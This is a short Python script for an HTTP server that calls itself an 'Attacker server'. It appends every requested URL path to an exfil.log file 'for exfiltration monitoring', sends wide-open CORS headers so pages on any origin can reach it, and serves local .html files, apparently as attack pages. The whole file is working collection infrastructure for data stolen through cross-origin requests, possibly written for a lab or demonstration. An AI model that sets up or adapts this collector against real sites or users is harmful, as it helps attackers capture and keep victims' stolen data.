from http.server import BaseHTTPRequestHandler, HTTPServer
import os

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log path for exfiltration monitoring
        with open("exfil.log", "a") as f:
            f.write(self.path + "\n")

        # CORS headers
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

        # Serve .html files if requested
        if self.path == "/" or self.path == "/index.html":
            file_path = "index.html"
        else:
            file_path = self.path.strip("/")

        if os.path.isfile(file_path) and file_path.endswith(".html"):
            with open(file_path, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.wfile.write(b"OK")

    def do_OPTIONS(self):
        # Handle preflight CORS requests
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

if __name__ == "__main__":
    print("Attacker server running at http://localhost:8080")
    HTTPServer(('', 8080), Handler).serve_forever()
